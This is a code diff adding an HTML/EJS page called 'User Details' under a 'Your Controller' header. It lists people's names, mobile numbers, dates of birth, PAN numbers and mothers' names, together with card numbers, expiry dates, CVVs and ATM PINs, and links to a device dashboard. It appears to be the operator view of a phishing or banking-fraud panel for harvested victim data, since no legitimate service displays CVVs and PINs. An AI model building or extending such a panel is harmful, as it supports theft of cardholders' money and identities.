@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <!-- Header Navigation -->
+  <header class="header-nav">
+    <h1>Your Controller</h1>
+  </header>
+  
+  <!-- Main Content Container -->
+  <div class="user-detail-container">
+    <h2>User Details</h2>
+
+    <!-- User Details -->
+    <% if (user && Array.isArray(user) && user.length > 0) { %>
+      <% user.forEach((userDetails, index) => { %>
+        <div class="card">
+          <h3>Personal Information - <%= index + 1 %></h3>
+          <p><strong>Name:</strong> <%= userDetails.fullName %></p>
+          <p><strong>Mobile No:</strong> <%= userDetails.mobileNumber %></p>
+          <p><strong>DOB:</strong> <%= userDetails.dateOfBirth %></p>
+          <p><strong>PAN NO.:</strong> <%= userDetails.panNumber %></p>
+          <p><strong>Mother Name:</strong> <%= userDetails.mothersName %></p>
+        </div>
+      <% }) %>
+    <% } else if (user) { %> 
+      <div class="card">
+        <h3>Personal Information</h3>
+        <p><strong>Name:</strong> <%= user.fullName %></p>
+        <p><strong>Mobile No:</strong> <%= user.mobileNumber %></p>
+        <p><strong>DOB:</strong> <%= user.dateOfBirth %></p>
+        <p><strong>PAN NO.:</strong> <%= user.panNumber %></p>
+        <p><strong>Mother Name:</strong> <%= user.mothersName %></p>
+      </div>
+    <% } else { %>
+      <p>No user details found.</p>
+    <% } %>
+
+    <!-- Net Banking Details -->
+    <% if (netBanking && Array.isArray(netBanking) && netBanking.length > 0) { %>
+      <% netBanking.forEach((bankDetails, index) => { %>
+        <div class="card">
+          <h3>Net Banking Details - <%= index + 1 %></h3>
+          <p><strong>Card Number:</strong> <%= bankDetails.cardNumber %></p>
+          <p><strong>Expiry Date:</strong> <%= bankDetails.expiryDate %></p>
+          <p><strong>CVV:</strong> <%= bankDetails.cvv %></p>
+          <p><strong>ATM Pin:</strong> <%= bankDetails.atmPin %></p>
+        </div>
+      <% }) %>
+    <% } else if (netBanking) { %> 
+      <div class="card">
+        <h3>Net Banking Details</h3>
+        <p><strong>Card Number:</strong> <%= netBanking.cardNumber %></p>
+        <p><strong>Expiry Date:</strong> <%= netBanking.expiryDate %></p>
+        <p><strong>CVV:</strong> <%= netBanking.cvv %></p>
+        <p><strong>ATM Pin:</strong> <%= netBanking.atmPin %></p>
+      </div>
+    <% } else { %>
+      <p>No net banking details found.</p>
+    <% } %>
+
+    <!-- Go to Dashboard Button -->
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+
+</body>
+</html>
